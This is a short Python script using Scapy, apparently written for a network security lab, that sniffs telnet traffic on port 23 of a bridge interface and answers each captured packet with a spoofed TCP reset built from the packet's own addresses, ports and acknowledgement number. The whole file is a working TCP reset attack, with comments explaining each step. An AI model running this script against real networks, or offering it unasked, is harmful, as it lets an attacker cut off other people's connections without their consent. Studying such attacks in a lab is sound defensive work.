#!/usr/bin/python3

from scapy.all import *

def spoof_tcp(pkt): #defining function for spoofing
	IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst) #get packet destination and source IP
	TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, #reply with reset flag and get sequence number from packet
		       dport=pkt[TCP].sport, sport=pkt[TCP].dport) #get destination port and source port from packet
	spoofpkt = IPLayer/TCPLayer #create spoofed packet
	ls(spoofpkt) #list contents of spoofed packet
	send(spoofpkt, verbose=0) #send spoofed packet
	
pkt=sniff(iface='br-a6d8ff0d3cf0', filter='tcp and port 23', prn=spoof_tcp)
#sniff for packet on listed interface, using listed filter, then perform listed function